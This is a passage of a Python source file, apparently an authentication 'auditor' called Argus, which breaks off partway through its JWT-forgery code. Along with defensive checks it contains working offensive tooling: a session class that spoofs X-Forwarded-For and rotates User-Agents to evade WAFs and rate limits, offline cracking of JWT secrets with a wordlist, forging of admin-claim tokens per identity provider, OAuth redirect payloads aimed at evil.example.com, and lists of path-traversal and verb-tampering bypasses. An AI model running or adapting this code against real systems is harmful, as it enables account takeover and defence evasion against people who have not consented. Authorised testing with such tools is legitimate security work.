#!/usr/bin/env python3
"""
auditing_tools/auth_tester.py — Authentication Security Auditor (v3.0)
═══════════════════════════════════════════════════════════════════════════════

Military-grade authentication auditing for Argus.

SAFETY MODEL
────────────
Every target request flows through `EvasionSession`:
  • Jittered pacing (defeats fixed-interval rate-limit fingerprints)
  • User-Agent + X-Forwarded-For rotation
  • Optional proxy rotation
  • Exponential back-off on 403/406/429/503
  • Automatic cool-down when a WAF block page is observed

Aggressive tests (rate-limit probing, timing enumeration, XSW POST
attempts) are gated behind `--aggressive` and off by default.

NINE PHASES
───────────
  0. Technology fingerprinting    WAF + auth provider + framework
  1. Surface discovery            login / oauth / saml / jwt / 2fa / reset
  2. JWT analysis                 static + offline crack + forgery chain
  3. OAuth                        redirect_uri + PKCE + state + implicit
  4. SAML                         metadata + XSW surface + XXE surface
  5. Session & cookie security    attrs + prefix misuse + session fixation
  6. CSRF                         form token + SameSite chain correlation
  7. Auth bypass matrix           paths + verbs + case + null byte + override
  8. Account security             rate-limit + username enumeration (aggressive)

CONFIRMATION CHAINS (drive severity upgrades)
─────────────────────────────────────────────
  jwt-forgery        weak secret + protected endpoint        → CRITICAL
  oauth-leak         redirect_uri bypass + working redirect  → CRITICAL
  session-fixation   session survives login boundary         → HIGH
  csrf-chain         missing token + SameSite=None           → HIGH
  verb-bypass        HEAD/OPTIONS reaches protected path     → HIGH
  cookie-xss         HttpOnly missing + XSS surface present  → HIGH

OUTPUTS
───────
  auth_findings.json      — every finding
  auth_confirmed.json     — HIGH/CRITICAL/chain-confirmed only
  auth_chains.json        — structured chain records
  auth_candidates.txt     — flat triage list
  jwt_candidates.txt / oauth_candidates.txt / saml_candidates.txt
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import logging
import random
import re
import statistics
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Any, Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

log = logging.getLogger("argus.auth_tester")

# ═════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ═════════════════════════════════════════════════════════════════════════════

try:
    import config as CFG
    CFG_LOADED = True
except ImportError:
    CFG = None
    CFG_LOADED = False

try:
    from db import DB
    DB_AVAILABLE = True
except ImportError:
    DB = None
    DB_AVAILABLE = False


def _cfg(key: str, default=None):
    return getattr(CFG, key, default) if CFG_LOADED else default


def _auth_settings() -> dict:
    entry = (_cfg("MODULE_RATE_LIMITS", {}) or {}).get("auth", {}) or {}
    return {
        "rate_limit":  entry.get("rate_limit", 2),
        "concurrency": entry.get("concurrency", 2),
        "timeout":     entry.get("timeout", 12),
        "jitter":      entry.get("jitter", 0.5),
        "proxies":     entry.get("proxies", []),
    }


def _target_headers() -> dict[str, str]:
    h = dict(_cfg("ACTIVE_HEADERS", {}) or {})
    if CFG_LOADED and getattr(CFG, "AUTH_ENABLED", False):
        h.update(getattr(CFG, "AUTH_HEADERS", {}) or {})
    return h


def _auth_cookies() -> dict[str, str]:
    if not CFG_LOADED or not getattr(CFG, "AUTH_ENABLED", False):
        return {}
    return dict(getattr(CFG, "AUTH_COOKIES", {}) or {})


# ═════════════════════════════════════════════════════════════════════════════
#  SEVERITY
# ═════════════════════════════════════════════════════════════════════════════

class Severity(str, Enum):
    INFO     = "INFO"
    LOW      = "LOW"
    MEDIUM   = "MEDIUM"
    HIGH     = "HIGH"
    CRITICAL = "CRITICAL"

    @property
    def rank(self) -> int:
        return {"INFO": 0, "LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}[self.value]


def _is_confirmed(sev: Severity) -> bool:
    """HIGH and above, or MEDIUM on chains — this is what lands in auth_confirmed.json."""
    return sev.rank >= Severity.HIGH.rank


# ═════════════════════════════════════════════════════════════════════════════
#  WAF DETECTION
# ═════════════════════════════════════════════════════════════════════════════

WAF_SIGNATURES: dict[str, dict] = {
    "Cloudflare":  {"headers": ["cf-ray", "__cf_bm", "cf-cache-status"],
                    "body":    ["Attention Required! | Cloudflare", "cloudflare-nginx"]},
    "Akamai":      {"headers": ["akamai-grn", "x-akamai-transformed", "_abck"],
                    "body":    ["Access Denied", "Reference&#32;&#35;"]},
    "Imperva":     {"headers": ["x-iinfo", "incap_ses", "_Incapsula_Resource"],
                    "body":    ["Pardon Our Interruption", "Incapsula incident ID"]},
    "AWS WAF":     {"headers": ["x-amzn-requestid", "x-amzn-errortype", "awselb"],
                    "body":    ["Request blocked", "AWS WAF"]},
    "F5 BIG-IP":   {"headers": ["x-wa-info", "bigipserver"],
                    "body":    ["The requested URL was rejected", "F5 Networks"]},
    "Sucuri":      {"headers": ["x-sucuri-id", "x-sucuri-cache"],
                    "body":    ["Sucuri WebSite Firewall", "Access Denied - Sucuri"]},
    "DataDome":    {"headers": ["x-datadome", "datadome"],
                    "body":    ["datadome", "captcha-delivery"]},
    "ModSecurity": {"headers": ["x-mod-security"],
                    "body":    ["ModSecurity", "Not Acceptable!"]},
}


@dataclass
class WAFReport:
    vendor: str = "unknown"
    confidence: int = 0
    signals: list[str] = field(default_factory=list)
    blocked: bool = False


def detect_waf(session: "EvasionSession", url: str) -> WAFReport:
    report = WAFReport()
    try:
        resp = session.benign_get(url)
    except Exception:
        return report
    if resp is None:
        return report

    header_blob = " ".join(f"{k.lower()}:{v}" for k, v in resp.headers.items()).lower()
    body_blob = (resp.text or "")[:4000].lower()

    for vendor, sig in WAF_SIGNATURES.items():
        hits = [f"header:{h}" for h in sig["headers"] if h.lower() in header_blob]
        hits += [f"body:{b[:40]}" for b in sig["body"] if b.lower() in body_blob]
        if hits:
            report.vendor = vendor
            report.signals = hits
            report.confidence = min(100, 50 + 15 * len(hits))
            break

    if resp.status_code in (403, 406, 429, 503):
        low = (resp.text or "")[:2000].lower()
        if any(w in low for w in ("blocked", "denied", "firewall", "security", "captcha")):
            report.blocked = True
            if report.vendor == "unknown":
                report.vendor = "generic-waf"
                report.confidence = 40

    return report


# ═════════════════════════════════════════════════════════════════════════════
#  EVASION SESSION
# ═════════════════════════════════════════════════════════════════════════════

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
]


@dataclass
class EvasionProfile:
    rate_limit: float = 2.0
    jitter: float = 0.5
    rotate_ua: bool = True
    rotate_xff: bool = True
    proxies: list[str] = field(default_factory=list)
    backoff_codes: tuple[int, ...] = (403, 406, 429, 503)
    max_backoff: float = 30.0
    cooldown_after_block: float = 60.0


class EvasionSession:
    def __init__(self, profile: EvasionProfile, timeout: int = 12):
        self.profile = profile
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update(_target_headers())
        for k, v in _auth_cookies().items():
            self.session.cookies.set(k, v)

        self._min_interval = 1.0 / profile.rate_limit if profile.rate_limit > 0 else 0.0
        self._last = 0.0
        self._backoff = 0.0
        self._cooldown_until = 0.0
        self._proxy_idx = 0
        self._ua_idx = 0
        self._xff_counter = 0

    def __enter__(self):  return self
    def __exit__(self, *exc):
        try:  self.session.close()
        except Exception:  pass

    def _pace(self):
        now = time.monotonic()
        if now < self._cooldown_until:
            time.sleep(self._cooldown_until - now)
        interval = self._min_interval + random.uniform(0, self.profile.jitter)
        elapsed = time.monotonic() - self._last
        if elapsed < interval:
            time.sleep(interval - elapsed)
        if self._backoff > 0:
            time.sleep(self._backoff)
        self._last = time.monotonic()

    def _rotate(self):
        if self.profile.rotate_ua:
            self.session.headers["User-Agent"] = USER_AGENTS[self._ua_idx % len(USER_AGENTS)]
            self._ua_idx += 1
        if self.profile.rotate_xff:
            self._xff_counter += 1
            o = self._xff_counter % 254 + 1
            self.session.headers["X-Forwarded-For"] = f"10.0.{o}.{o}"
            self.session.headers["X-Real-IP"] = f"10.0.{o}.{o}"

    def _proxy(self) -> Optional[dict]:
        if not self.profile.proxies:
            return None
        p = self.profile.proxies[self._proxy_idx % len(self.profile.proxies)]
        self._proxy_idx += 1
        return {"http": p, "https": p}

    def request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        self._pace()
        self._rotate()
        proxy = self._proxy()
        try:
            resp = self.session.request(
                method, url,
                timeout=kwargs.pop("timeout", self.timeout),
                allow_redirects=kwargs.pop("allow_redirects", False),
                verify=False, proxies=proxy, **kwargs,
            )
        except requests.RequestException as e:
            log.debug(f"request failed: {method} {url}: {e}")
            return None

        if resp.status_code in self.profile.backoff_codes:
            self._backoff = min(self.profile.max_backoff,
                                max(1.0, self._backoff * 2 or 1.0))
            low = (resp.text or "")[:2000].lower()
            if any(w in low for w in ("blocked", "firewall", "captcha", "denied")):
                self._cooldown_until = time.monotonic() + self.profile.cooldown_after_block
                log.warning("  WAF block — cooling down %.0fs",
                            self.profile.cooldown_after_block)
        elif resp.status_code < 400:
            self._backoff = 0.0
        return resp

    def get(self, url: str, **kwargs):
        return self.request("GET", url, **kwargs)

    def post(self, url: str, **kwargs):
        return self.request("POST", url, **kwargs)

    def benign_get(self, url: str) -> Optional[requests.Response]:
        try:
            return self.session.get(url, timeout=self.timeout, verify=False)
        except requests.RequestException:
            return None


# ═════════════════════════════════════════════════════════════════════════════
#  AUTH TECHNOLOGY FINGERPRINT
# ═════════════════════════════════════════════════════════════════════════════

AUTH_TECH_SIGNATURES: dict[str, dict] = {
    "Auth0":      {"cookies": ["auth0"], "headers": ["x-auth0"],
                   "body": ["auth0.com", "cdn.auth0.com"]},
    "Okta":       {"cookies": ["okta"], "headers": ["x-okta"],
                   "body": ["okta.com", "oktacdn.com"]},
    "Keycloak":   {"cookies": ["KEYCLOAK_"], "headers": [],
                   "body": ["keycloak", "/realms/"]},
    "Firebase":   {"cookies": [], "headers": [],
                   "body": ["firebaseapp.com", "identitytoolkit"]},
    "Cognito":    {"cookies": ["cognito"], "headers": ["x-amzn-oidc"],
                   "body": ["cognito-idp", "amazoncognito"]},
    "Clerk":      {"cookies": ["__session"], "headers": ["x-clerk"],
                   "body": ["clerk.dev", "clerk.com"]},
    "Supabase":   {"cookies": ["sb-"], "headers": [],
                   "body": ["supabase.co", "supabase.com"]},
    "Stytch":     {"cookies": ["stytch"], "headers": ["x-stytch"],
                   "body": ["stytch.com"]},
    "WorkOS":     {"cookies": ["wos-"], "headers": ["x-workos"],
                   "body": ["workos.com", "workos.dev"]},
    "FusionAuth": {"cookies": ["fusionauth"], "headers": [],
                   "body": ["fusionauth", "/api/login"]},
    "Casdoor":    {"cookies": ["casdoor"], "headers": [],
                   "body": ["casdoor", "/api/login"]},
    "SuperTokens":{"cookies": ["st-"], "headers": ["st-auth-mode", "front-token"],
                   "body": ["supertokens"]},
}


def fingerprint_auth_tech(session: EvasionSession, url: str) -> str:
    try:
        resp = session.benign_get(url)
    except Exception:
        return "unknown"
    if resp is None:
        return "unknown"

    cookie_blob = " ".join(f"{c.name}={c.value}" for c in resp.cookies).lower()
    header_blob = " ".join(f"{k.lower()}:{v}" for k, v in resp.headers.items()).lower()
    body_blob = (resp.text or "")[:5000].lower()

    for tech, sig in AUTH_TECH_SIGNATURES.items():
        for cookie_hint in sig["cookies"]:
            if cookie_hint.lower() in cookie_blob:
                return tech
        for header_hint in sig["headers"]:
            if header_hint.lower() in header_blob:
                return tech
        for body_hint in sig["body"]:
            if body_hint.lower() in body_blob:
                return tech
    return "unknown"


# JWT claim names to escalate, per detected provider
JWT_ADMIN_CLAIMS: dict[str, list[tuple[str, Any]]] = {
    "Auth0":      [("roles", ["admin"]), ("https://example.com/roles", ["admin"])],
    "Okta":       [("groups", ["admin"]), ("roles", ["admin"])],
    "Keycloak":   [("realm_access", {"roles": ["admin", "realm-admin"]})],
    "Firebase":   [("admin", True), ("role", "admin")],
    "Cognito":    [("cognito:groups", ["admin"]), ("custom:role", "admin")],
    "Supabase":   [("role", "service_role"), ("role", "admin")],
    "unknown":    [("role", "admin"), ("roles", ["admin"]), ("is_admin", True)],
}


# ═════════════════════════════════════════════════════════════════════════════
#  CONSTANTS
# ═════════════════════════════════════════════════════════════════════════════

JWT_CRACK_WORDLIST = "/usr/share/wordlists/rockyou.txt"
JWT_MIN_SECRET_LEN = 8
MAX_JWT_CANDIDATES = 500

OAUTH_REDIRECT_PAYLOADS = [
    "https://evil.example.com",
    "https://target.com.evil.example.com",
    "https://target.com/../evil",
    "https://target.com/..%2fevil",
    "https://evil.example.com@target.com",
    "https://target.com%00.evil.example.com",
    "https://target.com\\@evil.example.com",
    "https://target.com:443@evil.example.com",
    "http://localhost",
    "http://127.0.0.1",
    "https://target.com/callback#evil.example.com",
]

SAML_ENDPOINT_RE = re.compile(r"/(saml|acs|metadata|idp|sp|sso)(/|$)", re.I)
SAML_XSW_VARIANTS = [
    "ID-mutation", "ID-attribute-mutation", "comment-injection",
    "duplicate-assertion", "unsigned-assertion-signed-response",
    "signed-assertion-stolen-signature", "response-to-tamper",
    "extension-signed-assertion",
]

# Force-browse path matrix
ADMIN_PATH_PATTERNS = [
    "/admin", "/administrator", "/internal", "/private", "/debug",
    "/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",
    "/management", "/manage", "/console", "/dashboard", "/panel",
    "/cp", "/control", "/api/admin", "/v1/admin", "/v2/admin", "/v3/admin",
    "/swagger-ui.html", "/swagger-ui/", "/api-docs", "/openapi.json",
    "/graphiql", "/graphql/console", "/.env", "/.git/config",
]

# Verb tampering
BYPASS_VERBS = ["HEAD", "OPTIONS", "PUT", "PATCH", "TRACE"]

# Path traversal bypasses (applied to a base protected path)
PATH_BYPASS_TEMPLATES = [
    "{p}/..;/", "{p}/../{p}", "{p}/./", "{p}//",
    "{p}%2e", "{p}/%2e%2e/", "{p}%00", "{p}%20",
    "{p}/.", "{p}/%2e/", "{p}..;/", "{p};/",
]

# Case variations for admin paths
def _case_variants(path: str) -> list[str]:
    segs = path.strip("/").split("/")
    out = set()
    for seg in segs:
        if not seg:
            continue
        out.add("/" + seg.lower())
        out.add("/" + seg.upper())
        out.add("/" + seg.capitalize())
    return sorted(out)

SESSION_COOKIE_HINTS = [
    "sess", "sid", "auth", "token", "jwt", "login", "user",
    "remember", "access",
]
CSRF_FIELD_HINTS = [
    "csrf", "xsrf", "_token", "authenticity_token",
    "csrf_token", "csrfmiddlewaretoken", "__requestverificationtoken",
]

USERNAME_ENUM_VALID_USERS = ["admin", "test", "user", "administrator", "root"]
USERNAME_ENUM_INVALID_USERS = ["zzq_no_user_9x8", "argus_probe_xyz", "nobody_test_q1"]


# ═════════════════════════════════════════════════════════════════════════════
#  DATA MODELS
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class AuthFinding:
    target: str
    vuln_type: str
    category: str = "general"
    severity: Severity = Severity.MEDIUM
    confidence: int = 50
    evidence: str = ""
    details: dict = field(default_factory=dict)
    remediation: str = ""
    tech: str = ""
    waf_vendor: str = ""
    chain_id: str = ""
    confirmed: bool = False
    auth_enabled: bool = False
    first_seen: str = ""

    @property
    def finding_hash(self) -> str:
        return hashlib.sha256(f"{self.target}|{self.vuln_type}".encode()).hexdigest()

    def to_dict(self) -> dict:
        return {
            "target":       self.target,
            "vuln_type":    self.vuln_type,
            "category":     self.category,
            "severity":     self.severity.value,
            "confidence":   self.confidence,
            "evidence":     self.evidence[:500],
            "details":      self.details,
            "remediation":  self.remediation,
            "tech":         self.tech,
            "waf_vendor":   self.waf_vendor,
            "chain_id":     self.chain_id,
            "confirmed":    self.confirmed,
            "auth_enabled": self.auth_enabled,
            "finding_hash": self.finding_hash,
            "first_seen":   self.first_seen,
        }


@dataclass
class AuthChain:
    chain_id: str
    name: str
    severity: Severity
    steps: list[str]
    finding_hashes: list[str] = field(default_factory=list)
    evidence: str = ""

    def to_dict(self) -> dict:
        return {
            "chain_id":       self.chain_id,
            "name":           self.name,
            "severity":       self.severity.value,
            "steps":          self.steps,
            "finding_hashes": self.finding_hashes,
            "evidence":       self.evidence[:500],
        }


# ═════════════════════════════════════════════════════════════════════════════
#  UTILITIES
# ═════════════════════════════════════════════════════════════════════════════

def _b64url_decode(s: str) -> bytes:
    s = s.strip()
    padding = 4 - (len(s) % 4)
    if padding != 4:
        s += "=" * padding
    return base64.urlsafe_b64decode(s)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _load_urls(input_file: Path) -> list[str]:
    if not input_file.exists():
        return []
    urls, seen = [], set()
    for line in input_file.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        tok = line.split()[0]
        if not tok.startswith(("http://", "https://")):
            tok = "https://" + tok
        if tok not in seen:
            seen.add(tok)
            urls.append(tok)
    return urls


def _extract_host(url: str) -> str:
    return urllib.parse.urlparse(url).hostname or ""


def _safe_dict(obj: Any, key: str) -> dict:
    if not isinstance(obj, dict):
        return {}
    v = obj.get(key)
    return v if isinstance(v, dict) else {}


def _safe_list(obj: Any, key: str) -> list:
    if not isinstance(obj, dict):
        return []
    v = obj.get(key)
    return v if isinstance(v, list) else []


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 0 — TECHNOLOGY FINGERPRINT
# ═════════════════════════════════════════════════════════════════════════════

def phase0_fingerprint(
    urls: list[str], session: EvasionSession, auth_on: bool, waf: WAFReport,
) -> tuple[str, list[AuthFinding]]:
    findings: list[AuthFinding] = []
    now = datetime.now(timezone.utc).isoformat()

    # Sample the first 5 hosts for tech fingerprint
    hosts = list({f"{urllib.parse.urlparse(u).scheme}://{urllib.parse.urlparse(u).netloc}"
                  for u in urls if _extract_host(u)})
    tech_votes: dict[str, int] = {}
    for host in hosts[:5]:
        tech = fingerprint_auth_tech(session, host)
        if tech != "unknown":
            tech_votes[tech] = tech_votes.get(tech, 0) + 1

    primary_tech = "unknown"
    if tech_votes:
        primary_tech = max(tech_votes, key=tech_votes.get)

    if primary_tech != "unknown":
        findings.append(AuthFinding(
            target="; ".join(hosts[:5]), vuln_type="auth_tech_identified",
            category="fingerprint", severity=Severity.INFO, confidence=90,
            evidence=f"Auth provider: {primary_tech} (votes: {tech_votes})",
            details={"provider": primary_tech, "votes": tech_votes},
            tech=primary_tech, waf_vendor=waf.vendor, auth_enabled=auth_on,
            first_seen=now,
        ))

    return primary_tech, findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 1 — SURFACE DISCOVERY
# ═════════════════════════════════════════════════════════════════════════════

AUTH_ENDPOINT_PATTERNS = {
    "login":    re.compile(r"/(login|signin|authenticate|auth|session|sso)(/|$|\?)", re.I),
    "oauth":    re.compile(r"/(oauth|authorize|callback|redirect|token)(/|$|\?)", re.I),
    "saml":     re.compile(r"/(saml|acs|metadata|idp|sp)(/|$|\?)", re.I),
    "jwt":      re.compile(r"/(token|jwt|refresh|verify)(/|$|\?)", re.I),
    "register": re.compile(r"/(register|signup|create-account)(/|$|\?)", re.I),
    "password": re.compile(r"/(password|reset|forgot|recover)(/|$|\?)", re.I),
    "2fa":      re.compile(r"/(2fa|mfa|otp|verify|code)(/|$|\?)", re.I),
}


def discover_auth_endpoints(urls: list[str]) -> dict[str, list[str]]:
    endpoints: dict[str, list[str]] = {k: [] for k in AUTH_ENDPOINT_PATTERNS}
    endpoints["all"] = []
    for url in urls:
        path = urllib.parse.urlparse(url).path
        matched = False
        for category, pattern in AUTH_ENDPOINT_PATTERNS.items():
            if pattern.search(path):
                endpoints[category].append(url)
                matched = True
        if matched:
            endpoints["all"].append(url)
    return endpoints


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 2 — JWT ANALYSIS + FORGERY CHAIN
# ═════════════════════════════════════════════════════════════════════════════

JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")


def extract_jwts(text: str) -> list[str]:
    return list(set(JWT_RE.findall(text)))


def decode_jwt(token: str) -> Optional[dict]:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return {"header": header, "payload": payload, "signature": parts[2]}
    except Exception:
        return None


def _crack_jwt_secret(token: str, wordlist_path: str, alg: str) -> Optional[str]:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    sig = _b64url_decode(parts[2])
    hash_fn = {"hs256": hashlib.sha256, "hs384": hashlib.sha384,
               "hs512": hashlib.sha512}.get(alg.lower())
    if not hash_fn or not Path(wordlist_path).exists():
        return None
    try:
        with open(wordlist_path, "r", errors="ignore") as f:
            for line in f:
                secret = line.strip().encode()
                if len(secret) < JWT_MIN_SECRET_LEN:
                    continue
                if hmac.compare_digest(hmac.new(secret, signing_input, hash_fn).digest(), sig):
                    return secret.decode()
    except Exception as e:
        log.debug(f"JWT crack failed: {e}")
    return None


def _forge_jwt(
    token: str, secret: str, tech: str, alg: str,
) -> Optional[str]:
    """
    Take an existing JWT, add admin-like claims based on detected provider,
    and re-sign with the cracked secret.
    """
    decoded = decode_jwt(token)
    if not decoded:
        return None
    header = dict(decoded["header"])
    payload = dict(decoded["payload"])

    # Inject admin claims for detected provider
    for claim, val in JWT_ADMIN_CLAIMS.get(tech, JWT_ADMIN_CLAIMS["unknown"]):
        payload[claim] = val

    # Refresh exp so we don't get rejected on expiry
    payload["exp"] = int(time.time()) + 3600
    payload["iat"] = int(time.time())

    hash_fn = {"hs256": hashlib.sha256, "hs384": hashlib.sha384,
               "hs512": hashlib.sha512}.get(alg.lower())
    if not hash_fn:
        return None

    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    signature = hmac.new(secret.encode(), signing_input, hash_fn).digest()
    return f"{header_b64}.{payload_b64}.{_b64url_encode(signature)}"


def _find_protected_endpoint(
    urls: list[str], session: EvasionSession,
) -> Optional[str]:
    """
    Find an endpoint that returns 401/403 without auth — candidates for
    testing a forged JWT.
    """
    for url in urls:
        path = urllib.parse.urlparse(url).path.lower()
        if not any(w in path for w in ("/admin", "/account", "/profile",
                                       "/dashboard", "/api/user", "/api/v1/me")):
            continue
        resp = session.get(url)
        if resp and resp.status_code in (401, 403):
            return url
    return None


def analyze_jwt(token: str, target: str, auth_on: bool, now_iso: str) -> list[AuthFinding]:
    findings: list[AuthFinding] = []
    decoded = decode_jwt(token)
    if not decoded:
        return findings

    hdr = decoded["header"]
    payload = decoded["payload"]
    alg = (hdr.get("alg") or "").lower()
    typ = (hdr.get("typ") or "").lower()

    # alg:none
    if alg == "none":
        findings.append(AuthFinding(
            target=target, vuln_type="jwt_alg_none", category="jwt",
            severity=Severity.CRITICAL, confidence=95,
            evidence="JWT uses alg:none (signature not verified)",
            details={"header": hdr},
            remediation="Reject alg:none; enforce signature verification",
            auth_enabled=auth_on, first_seen=now_iso,
        ))

    if not decoded["signature"] and alg != "none":
        findings.append(AuthFinding(
            target=target, vuln_type="jwt_empty_signature", category="jwt",
            severity=Severity.HIGH, confidence=85,
            evidence=f"JWT with alg={alg} has empty signature",
            details={"header": hdr},
            remediation="Enforce signature verification",
            auth_enabled=auth_on, first_seen=now_iso,
        ))

    if "exp" not in payload:
        findings.append(AuthFinding(
            target=target, vuln_type="jwt_missing_expiry", category="jwt",
            severity=Severity.MEDIUM, confidence=80,
            evidence="JWT has no 'exp' claim",
            details={"payload_keys": list(payload.keys())},
            remediation="Include exp claim; enforce short TTL",
            auth_enabled=auth_on, first_seen=now_iso,
        ))

    # Long-lived token (>24h)
    if "exp" in payload and "iat" in payload:
        try:
            lifetime = int(payload["exp"]) - int(payload["iat"])
            if lifetime > 86400:
                findings.append(AuthFinding(
                    target=target, vuln_type="jwt_long_lived", category="jwt",
                    severity=Severity.LOW, confidence=70,
                    evidence=f"JWT lifetime: {lifetime}s ({lifetime // 3600}h)",
                    details={"lifetime_s": lifetime},
                    remediation="Shorten token TTL; use refresh tokens",
                    auth_enabled=auth_on, first_seen=now_iso,
                ))
        except (TypeError, ValueError):
            pass

    kid = hdr.get("kid")
    if kid:
        kid_str = str(kid)
        if ".." in kid_str or "/" in kid_str or "\\" in kid_str:
            findings.append(AuthFinding(
                target=target, vuln_type="jwt_kid_path_traversal", category="jwt",
                severity=Severity.HIGH, confidence=75,
                evidence=f"kid contains path traversal: {kid_str}",
                details={"kid": kid_str},
                remediation="Validate kid against allow-list; never use as path",
                auth_enabled=auth_on, first_seen=now_iso,
            ))
        if any(c in kid_str for c in ("'", '"', " or ", "union ", "select ")):
            findings.append(AuthFinding(
                target=target, vuln_type="jwt_kid_sqli_surface", category="jwt",
                severity=Severity.HIGH, confidence=70,
                evidence=f"kid may be SQL-injectable: {kid_str}",
                details={"kid": kid_str},
                remediation="Parameterize kid lookups; validate format",
                auth_enabled=auth_on, first_seen=now_iso,
            ))

    for key in ("jku", "x5u"):
        if key in hdr:
            url = str(hdr[key])
            if url.startswith("http://"):
                findings.append(AuthFinding(
                    target=target, vuln_type=f"jwt_{key}_http", category="jwt",
                    severity=Severity.HIGH, confidence=85,
                    evidence=f"{key} points to HTTP: {url}",
                    details={key: url},
                    remediation=f"Require HTTPS for {key}",
                    auth_enabled=auth_on, first_seen=now_iso,
                ))
            if _extract_host(url) and _extract_host(url) != _extract_host(target):
                findings.append(AuthFinding(
                    target=target, vuln_type=f"jwt_{key}_external", category="jwt",
                    severity=Severity.HIGH, confidence=70,
                    evidence=f"{key} points to external host: {url}",
                    details={key: url},
                    remediation=f"Validate {key} against trusted hosts",
                    auth_enabled=auth_on, first_seen=now_iso,
                ))

    if "jwk" in hdr:
        findings.append(AuthFinding(
            target=target, vuln_type="jwt_embedded_jwk", category="jwt",
            severity=Severity.HIGH, confidence=75,
            evidence="JWT contains embedded jwk header",
            details={"jwk": hdr["jwk"]},
            remediation="Reject embedded jwk; use pre-configured keys",
            auth_enabled=auth_on, first_seen=now_iso,
        ))

    # Weak HMAC secret — offline crack
    if alg in ("hs256", "hs384", "hs512"):
        cracked = _crack_jwt_secret(token, JWT_CRACK_WORDLIST, alg)
        if cracked:
            findings.append(AuthFinding(
                target=target, vuln_type="jwt_weak_secret", category="jwt",
                severity=Severity.HIGH, confidence=100,
                evidence=f"HMAC secret cracked: {cracked[:8]}…",
                details={"secret_prefix": cracked[:8], "algorithm": alg},
                remediation="Use high-entropy secret; rotate immediately",
                auth_enabled=auth_on, first_seen=now_iso,
            ))

    return findings


def run_jwt_analysis(
    urls: list[str], session: EvasionSession,
    outdir: Path, auth_on: bool, threads: int,
    tech: str = "unknown",
) -> list[AuthFinding]:
    findings: list[AuthFinding] = []
    seen_tokens: set[str] = set()
    candidates: list[tuple[str, str]] = []
    now_iso = datetime.now(timezone.utc).isoformat()

    log.info("  Scanning for JWTs in responses...")

    def _scan_url(url: str) -> list[tuple[str, str]]:
        resp = session.get(url)
        if not resp:
            return []
        tokens: list[str] = []
        try:
            tokens.extend(extract_jwts(resp.text[:100000]))
        except Exception:
            pass
        for hdr_name in ("Authorization", "X-Auth-Token", "X-Access-Token"):
            val = resp.headers.get(hdr_name, "")
            if "bearer " in val.lower():
                tokens.extend(extract_jwts(val))
            elif JWT_RE.match(val):
                tokens.append(val)
        for cookie in resp.cookies:
            tokens.extend(extract_jwts(cookie.value))
        parsed = urllib.parse.urlparse(url)
        for _, vals in urllib.parse.parse_qs(parsed.query).items():
            for v in vals:
                tokens.extend(extract_jwts(v))
        return [(url, t) for t in tokens if t not in seen_tokens]

    with ThreadPoolExecutor(max_workers=max(1, threads)) as pool:
        futures = {pool.submit(_scan_url, u): u for u in urls[:MAX_JWT_CANDIDATES]}
        for fut in as_completed(futures):
            try:
                for url, token in fut.result():
                    if token not in seen_tokens:
                        seen_tokens.add(token)
                        candidates.append((url, token))
            except Exception:
                pass

    log.info(f"    Found {len(candidates)} unique JWT(s)")

    # Analyse each token
    weak_secrets: list[tuple[str, str, str]] = []  # (url, token, secret)
    for url, token in candidates:
        token_findings = analyze_jwt(token, url, auth_on, now_iso)
        findings.extend(token_findings)

        # Capture weak-secret findings for the forgery chain
        for f in token_findings:
            if f.vuln_type == "jwt_weak_secret":
                secret = f.details.get("secret_prefix", "")
                if secret:
                    # Recover full secret by re-cracking (cheap, cached)
                    decoded = decode_jwt(token)
                    if decoded:
                        alg = (decoded["header"].get("alg") or "").lower()
                        full = _crack_jwt_secret(token, JWT_CRACK_WORDLIST, alg)
                        if full:
                            weak_secrets.append((url, token, full))

    # ═══════════════════════════════════════════════════════════════════════
    #  JWT FORGERY CHAIN
    # ═══════════════════════════════════════════════════════════════════════
    forgery_chain_findings: list[AuthFinding] = []
    if weak_secrets:
        log.info(f"    Weak secrets detected on {len(weak_secrets)} token(s) — attempting forgery chain")
        protected = _find_protected_endpoint(urls, session)

        for url, token, secret in weak_secrets:
            decoded = decode_jwt(token)
            if not decoded:
                continue
            alg = (decoded["header"].get("alg") or "").lower()

            forged = _forge_jwt(token, secret, tech, alg)
            if not forged:
                continue

            if protected is None:
                # Chain can't be confirmed without a target
                forgery_chain_findings.append(AuthFinding(
                    target=url, vuln_type="jwt_forgery_ready", category="jwt",
                    severity=Severity.HIGH, confidence=85,
                    evidence=(
                        "Weak JWT secret cracked and admin token forged. "
                        "No protected endpoint discovered to test against."
                    ),
                    details={
